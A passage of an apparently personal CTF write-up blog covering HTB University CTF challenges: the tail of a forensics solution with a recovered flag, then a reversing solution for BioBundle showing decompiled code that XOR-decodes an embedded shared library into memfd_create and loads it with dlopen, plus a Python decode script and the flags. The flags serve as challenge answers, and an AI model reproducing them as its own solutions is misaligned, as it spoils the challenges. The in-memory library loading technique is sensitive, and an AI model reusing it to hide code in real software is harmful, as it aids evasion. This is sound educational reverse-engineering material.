</span></span><span style="display:flex;"><span>3ct3d_0ur_c0mmun1c4t10ns!!<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/for/configs
</span></span><span style="display:flex;"><span>$
</span></span></code></pre></div><p>look at the start lets gooo !!! we got the 2nd half of the flag !!!! <em>3ct3d_0ur_c0mmun1c4t10ns!!}</em></p>
<p>the flag : HTB{Z0mb13s_h4v3_inf3ct3d_0ur_c0mmun1c4t10ns!!}</p>
<h2 id="biobundle-medium-difficulty-reversing-challenge">BioBundle (Medium Difficulty Reversing Challenge)<a href="#biobundle-medium-difficulty-reversing-challenge" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h1 id="biobundle">BioBundle<a href="#biobundle" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>BioBundle is a medium difficulty reversing challenge.</p>
<p>we are given a rev_biobundle.zip file .</p>
<p>looking at the zip file we get a ELF file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/rev/rev_biobundle/wp
</span></span><span style="display:flex;"><span>$ unzip rev_biobundle.zip
</span></span><span style="display:flex;"><span>Archive:  rev_biobundle.zip
</span></span><span style="display:flex;"><span>   creating: rev_biobundle/
</span></span><span style="display:flex;"><span>  inflating: rev_biobundle/biobundle
</span></span><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/rev/rev_biobundle/wp
</span></span><span style="display:flex;"><span>$ cd rev_biobundle/
</span></span><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/rev/rev_biobundle/wp/rev_biobundle
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>biobundle
</span></span><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/rev/rev_biobundle/wp/rev_biobundle
</span></span><span style="display:flex;"><span>$ file biobundle
</span></span><span style="display:flex;"><span>biobundle: ELF 64-bit LSB pie executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>0ff6e374d4953a88af400e872f4df8d48fa5472e, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, not stripped
</span></span><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/rev/rev_biobundle/wp/rev_biobundle
</span></span><span style="display:flex;"><span>$
</span></span></code></pre></div><p>looking at this elf file in IDA.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">128</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-90h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>v5)(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>); <span style="color:#75715e">// [rsp+80h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>handle; <span style="color:#75715e">// [rsp+88h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_handle</span>(); <span style="color:#75715e">// intersting function  , we got no shared library in the zip right ? where can it be ? 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  v5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>))<span style="color:#a6e22e">dlsym</span>(handle, <span style="color:#e6db74">&#34;_&#34;</span>); <span style="color:#75715e">// trying to import a symbol(&#39;_&#39;) from a shared library whose handle is in the variable `handle` 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v5 )  
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(s, <span style="color:#ae81ff">127</span>, stdin);
</span></span><span style="display:flex;"><span>  s[<span style="color:#a6e22e">strcspn</span>(s, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">v5</span>(s) )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[*] Untangled the bundle&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[x] Critical Failure&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">get_handle</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf; <span style="color:#75715e">// [rsp+Fh] [rbp-1021h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-1020h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+18h] [rbp-1018h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v4[<span style="color:#ae81ff">4080</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-1010h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v5; <span style="color:#75715e">// [rsp+1018h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> fd; <span style="color:#75715e">// [rsp+1024h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> i; <span style="color:#75715e">// [rsp+1028h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">memfd_create</span>(<span style="color:#f92672">&amp;</span>unk_2004, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x3E07</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    buf <span style="color:#f92672">=</span> _[i] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x37</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(fd, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">1uLL</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)s <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(v4, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(v4));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sprintf</span>(s, <span style="color:#e6db74">&#34;/proc/self/fd/%d&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)fd);
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlopen</span>(s, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v5 )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v5;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>looking at the <a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">man</a> page.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">memfd_create</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> flags);
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// memfd_create() creates an anonymous file and returns a file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#75715e">// descriptor that refers to it.  The file behaves like a regular
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#75715e">// file, and so can be modified, truncated, memory-mapped, and so
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#75715e">//  on.  However, unlike a regular file, it lives in RAM and has a
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#75715e">//  Svolatile backing storage.
</span></span></span></code></pre></div><p>cool the memfd_create call will create a file and return a file descriptor to it &hellip; it will create a file with name &amp;unk_2004 which is :^) how cute!!.</p>
<p>then it will xor the the arr of symbol &ldquo;_&rdquo; with 0x37 and write it to the file andx then bascially open a handle to it .</p>
<p>so this variable &ldquo;_&rdquo; xorred with 0x37 will give us our shared library:
since :</p>
<p><em>A xor A=0</em>
consider:
<em>A xor 0x37=B</em>
<em>B xor 0x37=A xor 0x37 xor 0x37 = A</em></p>
<p>writing a simple python script for this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./biobundle&#34;</span>)
</span></span><span style="display:flex;"><span>a<span style="color:#f92672">=</span>elf<span style="color:#f92672">.</span>read(elf<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0004080</span> , <span style="color:#ae81ff">0x3E07</span>)
</span></span><span style="display:flex;"><span>b<span style="color:#f92672">=</span>[]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> a:
</span></span><span style="display:flex;"><span>    b<span style="color:#f92672">.</span>append(i<span style="color:#f92672">^</span><span style="color:#ae81ff">0x37</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># for i in b:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(chr(i),end=&#34;&#34;)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> bytearray(b)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;pasta&#34;</span>,<span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(p)
</span></span></code></pre></div><p>output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/rev/rev_biobundle
</span></span><span style="display:flex;"><span>$ python3 hax.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/av/ctf/htb-university-ctf/rev/rev_biobundle/biobundle&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:    No canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/rev/rev_biobundle
</span></span><span style="display:flex;"><span>$ file pasta
</span></span><span style="display:flex;"><span>pasta: ELF 64-bit LSB shared object, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, missing section headers at <span style="color:#ae81ff">15816</span>
</span></span><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/rev/rev_biobundle
</span></span><span style="display:flex;"><span>$ strings pasta|grep HTB
</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>st4tH
</span></span><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/rev/rev_biobundle
</span></span><span style="display:flex;"><span>$
</span></span></code></pre></div><p>its confired the flag is in the this shared object
lets open it in IDA.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>_BOOL8 <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">_</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s2[<span style="color:#ae81ff">28</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-40h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [rsp+2Ch] [rbp-24h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp+30h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp+38h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// [rsp+40h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v7; <span style="color:#75715e">// [rsp+48h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strcpy</span>(s2, <span style="color:#e6db74">&#34;HTB{st4t1c_l1b5_but_c00l3r}&#34;</span>);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strcmp</span>(a1, s2) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>yay we see the flag right there!
<em>flag:HTB{st4t1c_l1b5_but_c00l3r}</em></p>

      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2024 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
